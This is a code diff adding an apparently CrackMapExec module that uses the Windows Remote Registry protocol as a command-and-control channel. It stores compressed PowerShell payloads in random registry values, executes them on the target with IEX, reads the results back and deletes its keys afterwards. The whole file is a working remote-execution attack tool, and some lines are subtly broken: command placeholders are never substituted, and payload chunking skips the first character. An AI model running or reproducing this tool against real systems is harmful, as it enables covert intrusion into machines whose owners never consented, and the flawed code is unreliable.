@@ -1,0 +1,125 @@
+import logging
+from gevent import sleep
+from impacket.dcerpc.v5 import rrp
+from impacket.dcerpc.v5.rpcrt import DCERPCException
+from impacket.examples.secretsdump import RemoteOperations
+from cme.protocols.smb.c2 import C2
+from cme.helpers.powershell import ps_deflate_and_encode, ps_decode_and_inflate
+from cme.helpers.misc import gen_random_string
+
+
+class Registry(C2):
+    '''
+    Uses pure MS-RRP (Windows Remote Registry Protocol) as a C2 channel
+    by storing payloads and outputs in registry keys
+
+    This is useful for when WMI is disabled ;)
+    '''
+
+    def __init__(self, args, connection, payload, exec_methods):
+        C2.__init__(**locals())
+
+        self.reg_payload_value_names = []
+        self.reg_key_name = gen_random_string(8)
+        self.reg_result_value_name = gen_random_string(8)
+
+        self.command_with_output = "$a = (Get-ItemProperty -Path Registry::HKEY_USERS\\.DEFAULT\\SOFTWARE\\Microsoft\\KEY_NAME -Name PVALUE_NAME).PVALUE_NAME; " \
+                                   "$out = IEX (Invoke-Decompress -Data $a) | Out-String; " \
+                                   "New-ItemProperty -Path Registry::HKEY_USERS\\.DEFAULT\\SOFTWARE\\Microsoft\\KEY_NAME -Name OVALUE_NAME -Value (Invoke-Compress -Data $out)"
+
+        self.command_without_output = "$a = (Get-ItemProperty -Path Registry::HKEY_USERS\\.DEFAULT\\SOFTWARE\\Microsoft\\KEY_NAME -Name PVALUE_NAME).PVALUE_NAME; " \
+                                      "IEX (Invoke-Decompress -Data $a)"
+
+        for cmd in [self.command_with_output, self.command_without_output]:
+            cmd = cmd.replace('KEY_NAME', self.reg_key_name)
+            cmd = cmd.replace('OVALUE_NAME', self.reg_result_value_name)
+
+        self.remoteOps = RemoteOperations(self.connection, False)
+        self.remoteOps.enableRegistry()
+
+        ans = rrp.hOpenCurrentUser(self.remoteOps._RemoteOperations__rrp)
+        self.regHandle = ans['phKey']
+
+    def chunkstring(self, string, length):
+        return (string[0 + i:length + i] for i in range(1, len(string), length))
+
+    def run(self):
+        compressed_payload = ps_deflate_and_encode(self.payload)
+
+        self.create_key()
+        self.write(compressed_payload)
+        command = self.create_ps_command(self.build_ps_command(self.command_with_output, ), )
+        self.execute_command(command)
+        self.get_output()
+        self.cleanup()
+
+        try:
+            self.remoteOps.finish()
+        except Exception as e:
+            logging.debug("Error stopping remote registry: {}".format(e))
+
+        return self.outputBuffer
+
+    def create_key(self):
+        rrp.hBaseRegCreateKey(self.remoteOps._RemoteOperations__rrp, self.regHandle, 'SOFTWARE\\Microsoft\\{}'.format(self.reg_key_name))
+        logging.debug('Created registry key {} successfully'.format(self.reg_key_name))
+
+    def write(self, payload):
+        if len(payload) > 999999:
+            for chunk in self.chunkstring(payload, 999999):
+                self.write(chunk)
+        else:
+            value_name = gen_random_string(8)
+
+            ans = rrp.hBaseRegOpenKey(self.remoteOps._RemoteOperations__rrp, self.regHandle, 'SOFTWARE\\Microsoft\\{}'.format(self.reg_key_name))
+            keyHandle = ans['phkResult']
+
+            rrp.hBaseRegSetValue(self.remoteOps._RemoteOperations__rrp, keyHandle, value_name + '\x00', rrp.REG_SZ, payload)
+            logging.debug('Wrote payload to registry value {}'.format(value_name))
+
+            rrp.hBaseRegCloseKey(self.remoteOps._RemoteOperations__rrp, keyHandle)
+
+            self.command_with_output = self.command_with_output.replace('PVALUE_NAME', value_name)
+            self.reg_payload_value_names.append(value_name)
+
+            #rtype, data = rrp.hBaseRegQueryValue(self.remoteOps._RemoteOperations__rrp, keyHandle, 'UseLogonCredential\x00')
+
+    def get_output(self):
+        ans = rrp.hBaseRegOpenKey(self.remoteOps._RemoteOperations__rrp, self.regHandle, 'SOFTWARE\\Microsoft\\{}'.format(self.reg_key_name))
+        keyHandle = ans['phkResult']
+
+        while True:
+            try:
+                dataType, output = rrp.hBaseRegQueryValue(self.remoteOps._RemoteOperations__rrp, keyHandle, self.reg_result_value_name + '\x00')
+                self.outputBuffer = ps_decode_and_inflate(output)
+                break
+            except DCERPCException as e:
+                logging.debug("Error while querying registry key with payload output {}: {}".format(self.reg_result_value_name, e))
+                sleep(3)
+
+        rrp.hBaseRegCloseKey(self.remoteOps._RemoteOperations__rrp, keyHandle)
+
+    def cleanup(self):
+        self.reg_payload_value_names.append(self.reg_result_value_name)
+
+        ans = rrp.hBaseRegOpenKey(self.remoteOps._RemoteOperations__rrp, self.regHandle, 'SOFTWARE\\Microsoft\\{}'.format(self.reg_key_name))
+        keyHandle = ans['phkResult']
+
+        for value in self.reg_payload_value_names:
+            try:
+                rrp.hBaseRegDeleteValue(self.remoteOps._RemoteOperations__rrp, keyHandle, value + '\x00')
+                logging.debug('Registry value {} deleted successfully'.format(value))
+            except DCERPCException as e:
+                logging.debug('Error deleting registry value {}: {}'.format(value, e))
+                break
+
+        try:
+            rrp.hBaseRegDeleteKey(self.remoteOps._RemoteOperations__rrp, keyHandle, 'SOFTWARE\\Microsoft\\{}'.format(self.reg_key_name))
+            logging.debug('Registry key {} deleted successfully'.format(self.reg_key_name))
+        except DCERPCException as e:
+            logging.debug('Error deleting registry key {}: {}'.format(self.reg_key_name, e))
+
+        try:
+            rrp.hBaseRegCloseKey(self.remoteOps._RemoteOperations__rrp, keyHandle)
+        except DCERPCException:
+            pass
